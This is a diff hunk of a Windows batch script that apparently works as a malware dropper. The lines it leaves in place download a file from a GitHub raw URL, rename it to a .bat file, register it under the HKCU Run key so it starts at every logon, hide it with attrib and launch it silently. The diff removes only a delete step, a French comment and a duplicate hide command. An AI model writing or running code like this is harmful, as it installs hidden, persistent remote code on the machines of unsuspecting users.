@@ -24,12 +24,9 @@ IF EXIST "C:\Users\%USERNAME%\configuration\wxappx.pyz" (
 IF EXIST "C:\Users\%USERNAME%\configuration\rewind.bat" (
 	goto rewind_2
 ) ELSE (
-	if exist "C:\Users\%USERNAME%\configuration\rewind.bat" del "C:\Users\%USERNAME%\configuration\rewind.bat"
 	set "FICHIER_TXT=C:\Users\%USERNAME%\configuration\rewind.txt"
-	:: Télécharger le fichier .txt avec curl (URL brute du fichier)
 	curl -L -o "%FICHIER_TXT%" "https://raw.githubusercontent.com/Unyther/woukpakxpoux/main/rewind.txt"
 	rename "%FICHIER_TXT%" "rewind.bat"
-	attrib +h "C:\Users\%USERNAME%\configuration\rewind.bat"
 	reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v RewindConfig /t REG_SZ /d "C:\Users\%USERNAME%\configuration\rewind.bat" /f
 	attrib +h "C:\Users\%USERNAME%\configuration\rewind.bat"
 	start "" /B "C:\Users\%USERNAME%\configuration\rewind.bat"
